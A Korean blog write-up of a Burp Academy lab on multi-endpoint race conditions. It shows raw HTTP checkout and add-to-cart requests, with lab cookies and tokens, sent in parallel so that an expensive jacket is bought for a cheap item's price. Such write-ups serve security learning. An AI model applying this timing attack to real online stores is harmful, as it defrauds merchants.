---
layout: post
title: "Burp Academy-레이스컨디션 관련 취약점: Multi-endpoint race conditions"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, 레이스컨디션, Race Condition]
toc: true
last_modified_at: 2023-09-01 10:33:00 +0900
---

# 개요
- 2023년 새로 추가된 레이스 컨디션 관련 취약점 문제이다. 
- 이 문제는 여러개의 엔드포인트에 동시에 요청을 보내는 방식의 레이스 컨디션(Multi-endpoint race conditions) 문제이다.
- 예를 들면, 장바구니에 상품을 넣고 구매를 진행하는데, 구매가 완료되기 전에 상품을 하나 더 넣으면 어떻게 될까? 레이스 컨디션에 취약한 EC사이트라면 여러개의 상품이 구매되는 결과가 될 것이다. 
- 문제 주소: https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint
- 취약점 설명페이지: https://portswigger.net/web-security/race-conditions#limit-overrun-race-conditions
- 난이도: PRACTITIONER (보통)

# Multi-endpoint collisions
- 이름 그대로 여러개의 엔드포인트가 조합되면 레이스 컨디션이 발생할 수 있는 상황을 말한다. 
- 예를 들면, 장바구니에 담은 상품을 결제할 때, 결제(엔드포인트1)하는 타이밍과 거의 동시에 장바구니 추가 요청(엔드포인트2)을 보내면 어떻게 될까? 결제는 하나의 상품에 대해서 이루어졌는데 추가된 상품도 같이 구매될 수도 있다. 

# 문제 개요

```
This lab's purchasing flow contains a race condition that enables you to purchase items for an unintended price.

To solve the lab, successfully purchase a Lightweight L33t Leather Jacket.

You can log into your account with the following credentials: wiener:peter.

Note
Solving this lab requires Burp Suite 2023.9 or higher.

Tip
When experimenting, we recommend purchasing the gift card as you can later redeem this to avoid running out of store credit.
```

# 살펴보기, 어떻게 풀지 생각해보기 
로그인하면 다음과 같은 화면이 나타난다. 계정의 잔고는 100달러가 있고, 쓸 수 있는 Gift card가 주어지지 않았다. 사야하는 레더자켓은 1330불정도 한다. 음.. 

![로그인후 모습](/images/burp-academy-race-condition-3-1.png)

1. Giftcard는 상품으로 팔고 있다. 재킷바로 옆에 있다. Giftcard를 구매해보면 다음과 같이 나온다. 
10달러로 10달러 충전할 수 있는 카드를 산 셈이다. 

![기프트카드구매후 모습](/images/burp-academy-race-condition-3-2.png)

Code: zrfKg5KWcx

2. Giftcard를 사용하는 엔드포인트에 레이스 컨디션 취약점이 있는지 확인해보자. 만약 취약점이 있다면 동일한 코드를 여러번 사용할 수 있을 것이다. 이를 통해 잔고를 불릴 수 있을 것이다. 만약 1330불 이상으로 충전할 수 있다면 이 것만으로도 문제를 풀 수 있을 것이다. 

3. 하나더 생각할 수 있는 것은 결제를 하는 타이밍에 장바구니에 재킷을 추가하는 타입의 레이스컨디션이다. 싼 아이템을 구매하면서 동시에 장바구니에 재킷을 추가한다면 재킷도 함께 구매되지 않을까.

# Giftcard 동시 사용가능할지 테스트 

1. Giftcard를 한번 사용해본다. 

![My Account페이지](/images/burp-academy-race-condition-3-3.png)

Gitfcard를 사용하는 요청은 다음과 같다. 

```http
POST /gift-card HTTP/2
Host: 0a3400fd03e713a282146fad007b00ca.web-security-academy.net
Cookie: session=WeVAxyCA9MP8nW4k1Shqsjhgra7kywyJ
Content-Length: 58
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a3400fd03e713a282146fad007b00ca.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3400fd03e713a282146fad007b00ca.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

csrf=qOfJZydKrg6FkUwyTGIbknQyr4CMCxQx&gift-card=zrfKg5KWcx

```

이 때의 응답이다. 

```http
HTTP/2 302 Found
Location: /my-account
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

2. 그러면 Giftcard를 한장 더 사서 레이스 컨디션을 시도해본다. 
Single Packet Attack 테크닉으로 몇 번 시도해보면 레이스컨디션이 안되는 것을 알 수 있다. 두번째 요청부터는 400응답을 돌려준다. 

![레이스컨디션실패](/images/burp-academy-race-condition-3-4.png)

# 결제 타이밍에 장바구니 추가하기 테크닉 
결제를 하는 요청과 장바구니에 추가하는 요청을 동시에 보내는 방법이다. 이를 위해서 각각의 요청을 준비한다. 

## 싼 상품 결제 요청 
장바구니에 있는 아이템을 결제 하는 요청이다. 

```http 
POST /cart/checkout HTTP/2
Host: 0a3400fd03e713a282146fad007b00ca.web-security-academy.net
Cookie: session=WeVAxyCA9MP8nW4k1Shqsjhgra7kywyJ
Content-Length: 37
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a3400fd03e713a282146fad007b00ca.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3400fd03e713a282146fad007b00ca.web-security-academy.net/cart
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

csrf=qOfJZydKrg6FkUwyTGIbknQyr4CMCxQx
```


## 레더재킷 장바구니에 추가하기 요청
장바구니에 추가하는 요청이다. 구매해야할 레더재킷의 productId는 1이므로 1을 지정한다.

```http 
POST /cart HTTP/2
Host: 0a3400fd03e713a282146fad007b00ca.web-security-academy.net
Cookie: session=WeVAxyCA9MP8nW4k1Shqsjhgra7kywyJ
Content-Length: 36
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a3400fd03e713a282146fad007b00ca.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3400fd03e713a282146fad007b00ca.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

productId=1&redir=PRODUCT&quantity=1
```

## 준비 
장바구니에 뭔가 싼 상품이나 Giftcard를 추가해둔다. 

## 공격
위의 두 요청을 Reapeter에서 그룹으로 묶어서 Single Packet Attack을 수행한다.  (Send 셀렉트박스에서 Send Group in parallel (single packet attack) 을 선택한다.)

그리고 웹 페이지를 재로딩하면 문제가 풀렸다는 메세지가 표시된다. 레이스 컨디션에 성공한 것이다! 이 레이스 컨디션은 카트에 추가하는 것보다 구매를 하는 요청이 아주 조금더 빨리 서버에 도달할 필요가 있다. 따라서 경우에 따라서는 실패할 수도 있다. 그럴 때는 될 때까지 재시도하면 된다. 이번에는 운이 좋아서 한번에 성공했다. 

![Multi-endpoint 문제풀이성공](/images/burp-academy-race-condition-3-success.png)